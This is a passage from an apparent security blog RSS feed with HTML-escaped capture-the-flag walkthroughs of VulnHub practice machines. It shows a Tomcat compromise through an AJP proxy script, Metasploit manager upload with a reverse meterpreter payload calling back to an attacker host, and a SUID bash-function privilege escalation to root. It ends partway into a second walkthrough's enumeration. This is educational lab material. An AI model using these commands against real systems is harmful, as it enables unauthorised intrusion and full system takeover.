 &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin-script&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manager&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manager-gui&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manager-script&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manager-jmx&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;manager-status&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;user name=&quot;admin&quot; password=&quot;adminadmin&quot; roles=&quot;admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot; /&amp;gt; --&amp;gt;&lt;/span&gt;


&lt;span class=&quot;nt&quot;&gt;&amp;lt;user&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sl33py&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Gu3SSmYStR0NgPa$sw0rD!&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;roles=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tomcat-users&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;apache-tomcat-jserv-proxy-setup&quot;&gt;Apache Tomcat JServ Proxy setup&lt;/h2&gt;

&lt;p&gt;During enumeration JServ protocol was discovered exposed on the default port &lt;code&gt;TCP: 8009&lt;/code&gt;. A local Apache proxy was setup on the attacking machine proxying requests back to the target JServ application server.&lt;/p&gt;

&lt;h3 id=&quot;apache-tomcat-proxy-setup-script&quot;&gt;Apache Tomcat Proxy Setup Script&lt;/h3&gt;

&lt;p&gt;Script for automation of JServ Proxy on Attacking machine:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
    apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;libapache2-mod-jk &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s#JkWorkersFile /etc/libapache2-mod-jk/workers.properties#JkWorkersFile /etc/apache2/workers.properties#g'&lt;/span&gt; /etc/apache2/mods-enabled/jk.conf
    &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /etc/libapache2-mod-jk/workers.properties /etc/apache2/
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s#worker.ajp13_worker.host=localhost#worker.ajp13_worker.host=192.168.30.146#g'&lt;/span&gt; /etc/apache2/workers.properties
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'/\Host\&amp;gt;/i JKMount /* ajp13_worker'&lt;/span&gt; /etc/apache2/sites-enabled/000-default.conf
    a2enmod proxy_http proxy_ajp
    service apache2 restart&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Tomcat should be exposed when visiting &lt;code&gt;http://127.0.0.1&lt;/code&gt; in &lt;strong&gt;Firefox&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sleepy/tomcat-jserv-apache-proxy.png&quot; alt=&quot;Tomcat JServ Apache Proxy&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;remote-exploitation&quot;&gt;Remote Exploitation&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Tomcat&lt;/strong&gt; is now exposed and login credentials have been obtained, it’s now possible to login via Tomcat Manager and leverage a shell via Metasploit.&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;FingerprintCheck&lt;/h5&gt;
  &lt;p&gt;The option: &lt;code&gt;set FingerprintCheck false&lt;/code&gt; needs to be configured or meterpreter will throw the following error:&lt;/p&gt;
  &lt;p&gt;&lt;code&gt;[-] [2015.11.26-13:17:44] Exploit aborted due to failure: not-found: The target &lt;br /&gt; server fingerprint &quot;Apache/2.4.10 (Debian)&quot; does not match &quot;(?-mix:Apache.*(Coy&lt;br /&gt;ote|Tomcat))&quot;, use 'set FingerprintCheck false' to disable this check.&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tomcat_mgr_upload&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/multi/http/tomcat_mgr_upload&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name       Current Setting         Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   PASSWORD   Gu3SSmYStR0NgPa&lt;span class=&quot;nv&quot;&gt;$sw0rD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;  no        The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
   Proxies                            no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
   RHOST      0.0.0.0                 &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address
   RPORT      80                      &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port
   TARGETURI  /manager                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The URI path of the manager app &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/html/upload and /undeploy will be used&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   USERNAME   sl33py                  no        The username to authenticate as
   VHOST                              no        HTTP server virtual host


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;java/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   LHOST  192.168.30.134   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address
   LPORT  4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Java Universal&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/h3&gt;

&lt;p&gt;An unprivileged meterpreter shell was obtained:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sleepy/meterpreter.png&quot; alt=&quot;meterpreter shell&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Searching for SUID files discovered a binary called &lt;code&gt;nightmare&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-print&lt;/span&gt; 2&amp;gt; /dev/null
find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-print&lt;/span&gt; 2&amp;gt; /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/nightmare
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;binary-interrogation&quot;&gt;Binary Interrogation&lt;/h3&gt;

&lt;p&gt;The &lt;code&gt;nightmare&lt;/code&gt; binary was copied to the attacking machine and interrogated with strings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sleepy/strings.png&quot; alt=&quot;nightmare binary strings&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The binary &lt;code&gt;nightmare&lt;/code&gt; appears to execute &lt;code&gt;/user/bin/sl&lt;/code&gt; as the root user (SUID is on the execute bit).&lt;/p&gt;

&lt;h3 id=&quot;bash-function-manipulation&quot;&gt;Bash Function Manipulation&lt;/h3&gt;

&lt;p&gt;Function manipulation was leveraged to execute &lt;code&gt;/bin/sh&lt;/code&gt; by the nightmare binary, providing a root shell thus fully compromising the system.&lt;/p&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;Nightmare Process&lt;/h5&gt;
  &lt;p&gt;After execution of &lt;code&gt;/usr/bin/nightmare&lt;/code&gt; it was necessary to kill the &lt;code&gt;nightmare&lt;/code&gt; process using &lt;code&gt;kill -2&lt;/code&gt; via another shell in order for the root shell to spawn correctly. To search for the process use &lt;code&gt;ps aux | grep nightmare&lt;/code&gt; and use &lt;code&gt;kill -2&lt;/code&gt; command to kill the pid.&lt;/p&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
Process 11 created.
Channel 14 created.


python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
bash-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

bash-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; /usr/bin/sl&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; /bin/sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; /usr/bin/sl&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; /bin/sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/bin/sl
&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/bin/sl
bash-4.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Again &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/n]? sh-4.2# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,91&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tomcat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;system_u:system_r:tomcat_t:s0
sh-4.2# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/flag.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/flag.txt
Well &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;

Here&lt;span class=&quot;s1&quot;&gt;'s your flag: 3eb030c6ab099b0a355712fe38d59ffb&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sleepy/root-flag.png&quot; alt=&quot;nightmare binary strings&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>/dev/random Pipe walkthrough</title>
          <link>https://highon.coffee/blog/pipe-ctf-walkthrough/</link>
          <pubDate>Thu, 26 Nov 2015 01:05:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/pipe-ctf-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#description&quot; id=&quot;markdown-toc-description&quot;&gt;Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#source-code-interrogation&quot; id=&quot;markdown-toc-source-code-interrogation&quot;&gt;Source Code Interrogation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#phpjs-interrogation&quot; id=&quot;markdown-toc-phpjs-interrogation&quot;&gt;php.js Interrogation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#logphpbak-interrogation&quot; id=&quot;markdown-toc-logphpbak-interrogation&quot;&gt;log.php.BAK Interrogation&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#burp-suite---post-request&quot; id=&quot;markdown-toc-burp-suite---post-request&quot;&gt;Burp Suite - POST Request&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#burp-decode-string&quot; id=&quot;markdown-toc-burp-decode-string&quot;&gt;Burp decode string&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#injecting-reverse-shell-code&quot; id=&quot;markdown-toc-injecting-reverse-shell-code&quot;&gt;Injecting Reverse Shell Code&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#php-shell&quot; id=&quot;markdown-toc-php-shell&quot;&gt;PHP Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#linux-local-privilege-escalation&quot; id=&quot;markdown-toc-linux-local-privilege-escalation&quot;&gt;Linux Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tar--unix-wildcards-local-privilege-escalation&quot; id=&quot;markdown-toc-tar--unix-wildcards-local-privilege-escalation&quot;&gt;Tar  Unix Wildcards Local Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#unix-wildcards&quot; id=&quot;markdown-toc-unix-wildcards&quot;&gt;Unix Wildcards&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#tar-arbitrary-command-execution&quot; id=&quot;markdown-toc-tar-arbitrary-command-execution&quot;&gt;Tar Arbitrary Command Execution&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;Another short, but fun VM.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; &lt;a href=&quot;https://twitter.com/s4gi_&quot;&gt;@s4gi_ &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;http://www.vulnhub.com/entry/devrandom-pipe,124/&quot;&gt;/dev/random: Pipe&lt;/a&gt; via &lt;a href=&quot;https://twitter.com/VulnHub&quot;&gt;@VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;_______.__               
&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_____   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_|_____   ____  
 |     ___/  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/ __ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  |    |   |  |  |_&amp;gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  ___/
   |____|   |__|   __/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                |__|        &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;  ·VM· &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MiNi CHaLLeNGe BuiLT FoR ZaCoN Vi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    syn-ack Apache httpd
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index.php
|_http-server-header: Apache
|_http-title: 401 Unauthorized
111/tcp   open  rpcbind syn-ack 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42192/udp  status
|_  100024  1          47286/tcp  status
47286/tcp open  status  syn-ack 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
MAC Address: 00:0C:29:05:96:3D &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Uptime guess: 199.640 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Sat May  9 04:40:31 2015&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Network Distance: 1 hop
TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;262 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 6.7p1 Debian 5&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache HTTPD&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 111&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;rcpbind&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;n/a&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Running OWASP dirbuster against port 80 exposed &lt;code&gt;/scriptz/&lt;/code&gt;
containing javascript and php files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/dirbuster.png&quot; alt=&quot;OWASP DirBuster&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;source-code-interrogation&quot;&gt;Source Code Interrogation&lt;/h2&gt;

&lt;h3 id=&quot;phpjs-interrogation&quot;&gt;php.js Interrogation&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;js.php&lt;/code&gt; source revealed &lt;strong&gt;function
serialize&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;note:&lt;/strong&gt; &lt;em&gt;the examples at the bottom.&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;serialize&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mixed_value&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
//  discuss at: http://phpjs.org/functions/serialize/
// original by: Arpad Ray &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mailto:arpad@php.net&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
// improved by: Dino
// improved by: Le Torbi &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.letorbi.de/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
// improved by: Kevin van Zonneveld &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://kevin.vanzonneveld.net/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
// bugfixed by: Andrej Pavlovic
// bugfixed by: Garagoth
